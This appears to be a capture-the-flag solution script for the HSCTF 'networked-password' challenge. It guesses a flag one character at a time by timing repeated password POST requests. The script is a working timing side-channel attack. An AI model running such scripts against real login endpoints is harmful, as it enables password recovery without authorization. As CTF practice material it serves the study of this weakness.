import requests
import string


if __name__ == '__main__':
    used_string = string.ascii_letters + string.digits + '_}'
    target = 'https://networked-password.web.chal.hsctf.com/'
    password = 'hsctf{'

    payload = {'password': password}
    res = requests.post(target, payload)
    _time = res.elapsed.total_seconds()
    print(_time)

    for char in used_string:
        password += char
        res_time = 0
        for _ in range(3):
            payload = {'password': password}
            res = requests.post(target, payload)
            res_time += res.elapsed.total_seconds()

        print('{}: {}'.format(password, res_time))
        password = password[:-1]
